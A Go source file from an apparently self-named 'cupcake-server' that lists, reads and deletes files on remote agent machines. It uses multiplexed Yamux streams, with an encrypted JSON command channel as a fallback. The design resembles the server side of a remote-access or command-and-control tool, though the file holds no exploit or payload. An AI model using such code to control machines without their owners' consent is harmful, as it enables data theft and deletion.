package services

import (
	"cupcake-server/pkg/globals"
	"encoding/json"
	"fmt"
	"github.com/hashicorp/yamux"
	"io"
	"time"
)

// Helper: GetAgentSession retrieves the Yamux session for a TCP agent
func GetAgentSession(agentID string) (*yamux.Session, bool) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, false
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil {
		return nil, false
	}
	return client.YamuxSession, true
}

type FsRequest struct {
	Action string   `json:"action"` // "list", "read", "rm"
	Path   string   `json:"path"`
	Paths  []string `json:"paths,omitempty"`
}

type FsResponse struct {
	Status      string      `json:"status"`
	Error       string      `json:"error,omitempty"`
	Files       interface{} `json:"files,omitempty"`
	CurrentPath string      `json:"current_path,omitempty"`
	Content     string      `json:"content,omitempty"`
}

func GetFileList(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "list", Path: path})
}

func ReadFile(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "read", Path: path})
}

func DeleteFiles(agentID string, paths []string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "rm", Paths: paths})
}

func callFsAgent(agentID string, req FsRequest) (*FsResponse, error) {
	session, exists := GetAgentSession(agentID)
	if !exists {
		// ⚡️ FALLBACK: Use JSON-based command channel if Yamux is not supported/online (e.g. WebSocket agents)
		return callFsAgentFallback(agentID, req)
	}

	stream, err := session.Open()
	if err != nil {
		// Fallback on stream failure too
		return callFsAgentFallback(agentID, req)
	}
	defer stream.Close()

	// 1. Send Header (0x03 for FS)
	if _, err := stream.Write([]byte{0x03}); err != nil {
		return nil, err
	}

	// ⚡️ FIX: Use Encoder directly (No Binary Length Prefix!)
	if err := json.NewEncoder(stream).Encode(req); err != nil {
		return nil, fmt.Errorf("failed to send request: %v", err)
	}

	// 2. Read Response - ROBUST MODE (Read all until EOF then unmarshal)
	stream.SetReadDeadline(time.Now().Add(15 * time.Second))
	
	data, err := io.ReadAll(stream)
	if err != nil {
		return nil, fmt.Errorf("read stream failed: %v", err)
	}

	var resp FsResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("unmarshal failed: %v | Raw: %s", err, string(data))
	}

	if resp.Status == "error" {
		return nil, fmt.Errorf("agent error: %s", resp.Error)
	}

	return &resp, nil
}

func callFsAgentFallback(agentID string, req FsRequest) (*FsResponse, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// Map FsRequest to Protocol Command
	cmdType := ""
	switch req.Action {
	case "list":
		cmdType = "file_ls"
	case "read":
		cmdType = "file_download" // Agent uses file_download to return bytes
	case "rm":
		cmdType = "file_delete" // Agent uses file_delete
	default:
		return nil, fmt.Errorf("unsupported fallback action: %s", req.Action)
	}

	reqID := fmt.Sprintf("FS-%d", time.Now().UnixNano())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType: cmdType,
			Path:        req.Path,
			ReqID:       reqID,
		},
	}
	
	// If it's a multi-file delete, we might need a different handling, but for now single path
	if req.Action == "rm" && len(req.Paths) > 0 {
		if payload, ok := msg.Payload.(globals.CommandPayload); ok {
			payload.Path = req.Paths[0]
			msg.Payload = payload
		}
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, err
	}

	select {
	case res := <-resChan:
		pMap := res.(map[string]interface{})
		
		var fsResp FsResponse
		fsResp.Status = "ok"
		
		// Parse based on command type
		if cmdType == "file_ls" {
			if stdout, ok := pMap["stdout"].(string); ok {
				var files interface{}
				if err := json.Unmarshal([]byte(stdout), &files); err == nil {
					fsResp.Files = files
				}
			}
		} else if cmdType == "file_download" {
			if stdout, ok := pMap["stdout"].(string); ok {
				fsResp.Content = stdout // Base64
			}
		}
		
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return nil, fmt.Errorf("%s", stderr)
		}

		return &fsResp, nil
	case <-time.After(20 * time.Second):
		return nil, fmt.Errorf("agent response timeout")
	}
}
